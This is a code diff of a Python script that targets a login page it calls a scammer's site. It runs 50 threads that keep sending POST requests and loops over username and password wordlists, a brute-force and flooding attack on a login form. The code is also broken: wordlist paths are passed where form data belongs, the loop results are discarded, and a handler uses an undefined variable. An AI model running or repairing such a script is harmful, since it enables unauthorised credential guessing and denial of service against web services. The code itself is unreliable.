@@ -2,28 +2,37 @@
 
 import requests
 import threading
+import os.path
 
 # Enter the scammer's url
+#url = 'https://scammerwebapp/login'
 url = ''
 
-# Modify the data variable to attack whatever user input parameters needed.
-# This one is a login page.
-data = {
+# This one is a login page. Edit the directory paths and filenames according to your settings
+Email = '/usr/share/wordlists/all.txt'
+Password = '/usr/share/wordlists/Passwords/passwordlist.txt'
 
-    'Email': '',
-
-    'Password': '',
-}
-
-def do_request():
+def queueRequests():
     while True:
-        response = requests.post(url, data=data).text
+        response = requests.post(url, Email, Password)
         print(response)
+
+# Edit the directory & file names according to your PC
+for firstword in open('/usr/share/wordlists/all.txt'):
+    for secondword in open( '/usr/share/wordlists/Passwords/password.txt'):
+        [firstword.rstrip(), secondword.rstrip()]
+
+
+def handleResponse(req, interesting):
+    # currently available attributes: req.status, req.wordcount,
+    #req.length and req.response
+    if req.status != 404:
+        table.add(req)
 
 threads = []
 
 for i in range(50):
-        t = threading.Thread(target=do_request)
+        t = threading.Thread(target=queueRequests)
         t.daemon = True
         threads.append(t)
 
